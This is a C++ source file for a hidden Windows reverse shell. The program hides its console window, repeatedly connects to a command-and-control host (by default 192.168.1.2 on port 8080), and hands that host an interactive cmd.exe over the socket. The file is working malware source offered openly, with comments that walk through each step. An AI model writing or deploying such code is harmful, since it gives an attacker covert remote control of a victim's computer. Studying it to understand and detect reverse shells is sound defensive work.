
#include <winsock2.h>   // Windows socket over tcp/ip
#include <windows.h>    // required for calling other processes, initiating other headers and calls
#include <ws2tcpip.h>   // Windows socket over tcp/ip
#include <iostream>
#pragma comment(lib, "Ws2_32.lib") // inform the compiler to statically compile this library into the executable.
#define DEFAULT_BUFLEN 1024        // the length of the buffer's socket recv and send function.

void RunShell(char* serverIP, int serverPort) {
    while(true) {
        Sleep(5000);    // 1000 = One Second, so sleep 5 seconds
        SOCKET sock;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(serverIP);  //IP address received from main function
        addr.sin_port = htons(serverPort);     //Dest Port received from main function

        //Connecting to my C&C Hpst
        if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(sock, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(sock);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo; // specified the window station, standard handles, and appearance of the main window
                // for a process at creation time.
                PROCESS_INFORMATION pinfo; //contains process about the new process, parent process, child processes, etc.
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sock;

                //create new process and its primary thread. The new process runs in the security context of the calling process.
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

                WaitForSingleObject(pinfo.hProcess, INFINITE); // wait for this child process i.e cmd.exe to finish.
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                memset(RecvData, 0, sizeof(RecvData));
                int recvCode = recv(sock, RecvData, DEFAULT_BUFLEN, 0);
                if (recvCode <= 0) {
                    closesocket(sock);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "quit\n") == 0 || strcmp(RecvData, "exit\n") == 0 ) {
                    exit(0); // I will wait again for buffer to be received over the network. If I received one
                    //of those strings, I will stop the shell.
                }
            }
        }
    }
}


int main(int argc, char** argv) {
    FreeConsole(); //This function helps up to disable the console window so that is not visible to the user.
    if (argc == 3) {
        int port  = atoi(argv[2]); //Converting port in char datatype to integer format
        RunShell(argv[1], port);
    }
    else {
        char host[] = "192.168.1.2";
        int port = 8080;
        RunShell(host, port);
    }
    return 0;
}